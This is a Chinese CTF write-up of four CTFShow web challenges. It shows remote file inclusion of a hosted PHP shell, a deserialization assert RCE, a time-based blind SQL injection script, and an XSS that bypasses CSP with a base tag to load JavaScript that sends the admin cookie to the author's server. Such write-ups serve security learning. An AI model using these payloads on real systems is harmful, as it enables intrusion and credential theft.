# CTFShow2021七月赛Web



## warmup

```php
    $ext = pathinfo($_GET['file'], PATHINFO_EXTENSION);
    if($ext==='php'){
        include $_GET['file'];
    }
```

要求文件后缀为php，经过测试可以远程文件包含。VPS上写个php马直接包含即可。

```
?file=http://118.31.168.198:39543/feng.php
0=phpinfo();
```

存在disable_functions，拿函数绕一下即可。

```
0=var_dump(scandir('/'));
0=echo file_get_contents('/secret');
```



## cjbweb

反序列化，利用点：

```php
call_user_func($this->name,$this->msg);
```

但是有2个正则waf：

```php
        if(preg_match('/\d|\/|,|\([^()]*\([^()]*\)/',$this->msg)){
            $this->name="var_dump";
            $this->msg="You look dangerous!!!";
            $safe="I think waf is enough.";
        }
```

```php

    if(preg_match('/s:4:"name";s:\d:"v\w*"/',$info)){
        unserialize($info);
    }else{
        echo "I just love v";
    }
```

先看第一个正则waf，要求函数的参数不能有数字，斜杠，逗号，还有括号的什么组合，这个不重要。正常构造：

```php
<?php
class Hacker{
    public $name="assert";
    public $msg="phpinfo();";
}
echo serialize(new Hacker());
```

会发现过不了第二个waf。构造出来的是这样

```php
O:6:"Hacker":2:{s:4:"name";s:6:"assert";s:3:"msg";s:10:"phpinfo();";}
```

观察waf：

```
/s:4:"name";s:\d:"v\w*"/
```

可以发现它要求name的值以v开头。也就是说调用的函数是一个以v开头的函数。想不到可以利用的函数，但是可以想办法给它绕过。考虑到用的是`preg_match`，只要匹配到即可。因此想办法给个属性，它的值符合这个正则即可。

```php
<?php
class Hacker{
    public $feng = 's:4:"name";s:1:"v"';
    public $name="assert";
    public $msg="phpinfo();";
}
echo serialize(new Hacker());
```

然后想办法拿shell就行了，第一个正则我没怎么管，直接想办法assert：

```php
<?php
class Hacker{
    public $feng = 's:4:"name";s:1:"v"';
    public $name="assert";
    public $msg='assert($_POST[\'a\']);';
}
echo serialize(new Hacker());
```

```
info=O:6:"Hacker":3:{s:4:"feng";s:18:"s:4:"name";s:1:"v"";s:4:"name";s:6:"assert";s:3:"msg";s:20:"assert($_POST['a']);";}&a=phpinfo();
```

然后像第一题一样拿`$_POST['a']`rce即可。

```php
info=O:6:"Hacker":3:{s:4:"feng";s:18:"s:4:"name";s:1:"v"";s:4:"name";s:6:"assert";s:3:"msg";s:20:"assert($_POST['a']);";}&a=var_dump(file_get_contents('/you_never_know_my_name'));
```





## CTF知识问答

阴间题目100分不给flag。SQL注入，flag在数据库里。

经过测试，发现login.php存在SQL注入。

```php
username=-1'||sleep(1)%23&studentid=1&submit=%E6%8F%90%E4%BA%A4
```

可以延时1s，说明存在SQL注入。

再经过fuzz，发现至少过滤了这些：

```php
or
union
select
on
in
=
```

但是可以双写绕过。空格似乎没有过滤，但是有些词它是连着空格一起过滤的，因此不用空格，用`/**/`就可以减少麻烦。

等于号被过滤，拿大于号小于号绕过即可。

然后正常的SQL注入即可。

```php
username=-1'||if(ascii(substr(database(),1,1))<128,sleep(1),1)%23&studentid=1&submit=%E6%8F%90%E4%BA%A4  
会延时
username=-1'||if(ascii(substr(database(),1,1))<64,sleep(1),1)%23&studentid=1&submit=%E6%8F%90%E4%BA%A4
不延时
    
所以直接时间盲注，我没试能不能布尔注入。
```

写个python脚本：

```python
"""
Author:feng
"""
import requests
from time import *
url='http://c8966359-62e5-4f8b-baa5-ccc59388b22b.challenge.ctf.show:8080/login.php'


flag=''
for i in range(1,10000000):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        #payload="-1'||if(ascii(substr(database(),{},1))<{},sleep(0.5),1)#".format(i,j)
        #payload="-1'||if(ascii(substr((seselectlect/**/group_coonncat(table_name)/**/from/**/iinnfoorrmatioonn_schema.tables/**/whewherere/**/table_schema/**/lilikeke/**/database()),{},1))<{},sleep(1),1)#".format(i,j)
        #payload="-1'||if(ascii(substr((seselectlect/**/group_coonncat(column_name)/**/from/**/iinnfoorrmatioonn_schema.columns/**/whewherere/**/table_name/**/lilikeke/**/'ctf'),{},1))<{},sleep(1),1)#".format(i,j)
        payload="-1'||if(ascii(substr((seselectlect/**/group_coonncat(value)/**/from/**/ctf),{},1))<{},sleep(0.4),1)#".format(i,j)

    #payload="'||ascii(substr((load_file(reverse('dwssap/cte/'))),{},1))<{}#".format(i,j)

        data={
            'username':payload,
            'studentid':'1',
            'submit':'提交'
        }
        try:
            r=requests.post(url=url,data=data,timeout=0.3)
            #print(r.text)
            min = j
        except:
            max = j

        sleep(0.2)
```



flag在ctf表里。







## ezxss

不会XSS，学一波CSP。

f12发现：

```html
<!--?source=1-->
```

得到源码：

```php
<?php
if(!isset($_GET['user'])&&!isset($_GET['username'])&&!isset($_GET['source'])&&!isset($_GET['query'])){
    header("Location: ./?username=guest");
    die();
}
$test=md5(uniqid('',true));
header("Content-Security-Policy:  script-src 'strict-dynamic' 'nonce-$test'; img-src 'self'; style-src 'self';  font-src 'self'; frame-src 'none' ");
header ( "Cache-Control: no-cache, must-revalidate " );
function getCurrentUrl(){
    $scheme = $_SERVER['REQUEST_SCHEME'];
    $domain = $_SERVER['HTTP_HOST'];
    $requestUri = $_SERVER['REQUEST_URI'];
    $currentUrl = $scheme . "://" . $domain . $requestUri;
    return $currentUrl;
}
class user{
    public $username;
    public function __wakeup(){
        if (is_string($this->username)){
            if (preg_match('/script|<|>|onload|onerror/i',$this->username)){
                die('no xss');
            }
            else{
                echo '<h1 id="username">'.htmlentities('welcome back '.$this->username).'</h1>';
            }
        }
        else{
            echo '<h1 id="username">'.$this->username.'&nbsp&nbspis&nbsp&nbspnot&nbsp&nbspallowed,&nbsp&nbsponly&nbsp&nbspstring'.'</h1>';
            file_put_contents('admin.log',$_GET['user']);   //admin will check who attacks him in /admin.php
        }
    }
}
if (isset($_GET['source'])){
    $text=file_get_contents(__FILE__);
    echo $text;
    die();
}
if (isset($_GET['query'])){
    //drive bot to visit your page
    //source code : browser.get('http://127.0.0.1/?'+sys.argv[1])
    //query example:
    //your url : httP://127.0.0.1/?username=guest
    //query : username=guest
    $text=escapeshellarg($_GET['query']);
    #echo($text);
    system('python /var/xssbot/xssbot.py '.$text);
    //sleep(3);
    die();
}
echo "
<html>
<head>
<link rel='stylesheet' href='./css/stylesheet.css'>
</head>
";
echo "<!--?source=1-->\n";
echo "<body>\n";
if (isset($_GET['user'])){
    unserialize(urldecode(base64_decode($_GET['user'])));
}
else if(isset($_GET['username'])){
    echo '<h1 id="username">'.htmlentities('hello '.$_GET['username']).'</h1>';

}



echo '<div id="particles-js"></div>';


echo "
<script nonce='$test' src='./js/jquery-1.12.0.js'></script>
<script nonce='$test' src='./js/particles.min.js'></script>
<script nonce='$test' src='./js/app.js'></script>
 ";
echo "</body>
</html>
";


?>
```



因为不会XSS，问了一下出题人说xss就是要拿到管理员的cookie。所以想办法xss拿管理员cookie。

```php
if (isset($_GET['query'])){
    //drive bot to visit your page
    //source code : browser.get('http://127.0.0.1/?'+sys.argv[1])
    //query example:
    //your url : httP://127.0.0.1/?username=guest
    //query : username=guest
    $text=escapeshellarg($_GET['query']);
    #echo($text);
    system('python /var/xssbot/xssbot.py '.$text);
    //sleep(3);
    die();
}
```

让bot模拟管理员访问，想办法利用这个拿到cookie。

审计一下代码，发现代码中一共有三处xss，但是有2处都被`htmlentities`了，唯一一处没被转义的是这里的`else`：

```php
        if (is_string($this->username)){
            if (preg_match('/script|<|>|onload|onerror/i',$this->username)){
                die('no xss');
            }
            else{
                echo '<h1 id="username">'.htmlentities('welcome back '.$this->username).'</h1>';
            }
        }
        else{
            echo '<h1 id="username">'.$this->username.'&nbsp&nbspis&nbsp&nbspnot&nbsp&nbspallowed,&nbsp&nbsponly&nbsp&nbspstring'.'</h1>';
            file_put_contents('admin.log',$_GET['user']);   //admin will check who attacks him in /admin.php
        }
```

考虑利用反序列化xss，但是进入else的要求是不进入if

```php
if (is_string($this->username)){
```

不是字符串却要echo，很明显的php原生类的xss。想办法利用`Error`类或者`Exception`类即可。

因此xss的点就拿到了，接下来要绕CSP：

```php
header("Content-Security-Policy:  script-src 'strict-dynamic' 'nonce-$test'; img-src 'self'; style-src 'self';  font-src 'self'; frame-src 'none' ");
header ( "Cache-Control: no-cache, must-revalidate " );
```

```
Content-Security-Policy: 
script-src 'strict-dynamic' 'nonce-e8f8a73d24aa61894a7f7dd3c3aa416c'; 
img-src 'self'; 
style-src 'self';  
font-src 'self'; 
frame-src 'none'
```

发现`script-src`被设了nonce，需要script中给了正确的nonce才可以执行js代码。但是这里的nonce是

```php
$test=md5(uniqid('',true));
```

根据时间产生的唯一ID。

学一波CSP的绕过：

https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/

https://blog.szfszf.top/article/32/

学习到了利用base标签来绕过这个`script-src`的nonce：

> <base> 标签为页面上的所有链接规定默认地址或默认目标。
>
> 通常情况下，浏览器会从当前文档的 URL 中提取相应的元素来填写相对 URL 中的空白。
>
> 使用 <base> 标签可以改变这一点。浏览器随后将不再使用当前文档的 URL，而使用指定的基本 URL 来解析所有的相对 URL。这其中包括 <a>、<img>、<link>、<form> 标签中的 URL。



```html
<html>
<head>
<link rel='stylesheet' href='./css/stylesheet.css'>
</head>
<!--?source=1-->
<body>
<h1 id="username">hello guest</h1><div id="particles-js"></div>
<script nonce='6595cb029041d966743b9a7aafd07b41' src='./js/jquery-1.12.0.js'></script>
<script nonce='6595cb029041d966743b9a7aafd07b41' src='./js/particles.min.js'></script>
<script nonce='6595cb029041d966743b9a7aafd07b41' src='./js/app.js'></script>
 </body>
</html>
```

也就是说，默认的base就是当前的文档的url，然后根据地址确定url，比如下面的那些：

```php
src='./js/app.js'
```

而且下面的三个script是有着正确nonce值的，因此这三个的js是可以执行的：

```html
<script nonce='6595cb029041d966743b9a7aafd07b41'
```

因此想办法加载恶意的js即可。把base改成我们自己的VPS：

```php
<base href=\"http://118.31.168.198:39543\">
```



```php
<?php
class user{
    public $username;
    public function __construct()
    {

        $this->username = new Exception("<base href=\"http://118.31.168.198:39543\">");
    }
}
echo base64_encode(urlencode(serialize(new user())));
```

然后vps上写这么个js文件：`./js/app.js`：

```
root@iZbp14tgce8absspjkxi3iZ:~# cat ./js/app.js
window.open('http://118.31.168.198:39543/'+document.cookie)
```

然后起python：

```
python3 -m http.server 39543
```

再利用`query`打过去，即可得到cookie：

```
root@iZbp14tgce8absspjkxi3iZ:~# python3 -m http.server 39543
Serving HTTP on 0.0.0.0 port 39543 (http://0.0.0.0:39543/) ...
49.235.148.38 - - [10/Jul/2021 16:13:50] code 404, message File not found
49.235.148.38 - - [10/Jul/2021 16:13:50] "GET /js/jquery-1.12.0.js HTTP/1.1" 404 -
49.235.148.38 - - [10/Jul/2021 16:13:50] code 404, message File not found
49.235.148.38 - - [10/Jul/2021 16:13:50] "GET /js/particles.min.js HTTP/1.1" 404 -
49.235.148.38 - - [10/Jul/2021 16:13:50] "GET /js/app.js HTTP/1.1" 200 -
49.235.148.38 - - [10/Jul/2021 16:13:50] code 404, message File not found
49.235.148.38 - - [10/Jul/2021 16:13:50] "GET /flag=ctfshow%7B1d7180b4-ec0b-480e-ab9c-414a38971cd2%7D%0A HTTP/1.1" 404 -

```

























